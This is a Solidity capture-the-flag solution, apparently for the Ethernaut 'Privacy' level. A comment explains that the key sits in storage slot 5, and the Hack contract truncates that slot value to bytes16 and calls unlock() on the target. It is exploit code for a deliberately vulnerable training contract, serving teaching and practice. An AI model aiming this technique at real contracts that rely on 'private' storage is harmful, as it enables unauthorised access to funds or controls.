/*
    Kind of easy if you know how to read storages of contracts, if you don't..check out our `PrivateStorages` section in bonus folder..

    Anyways, let's get back to the challenge, the thing was just to get the slot of last element of data array, and if you go through the slots of `Privacy` contract, you will find that our target slot is 5, then just go with it!!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Privacy{
    function unlock(bytes16) external;
}

contract Hack{
    Privacy public target;

    constructor(address _victim) {
        target = Privacy(_victim);
    }

    function attack(bytes32 _slotValue) external {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}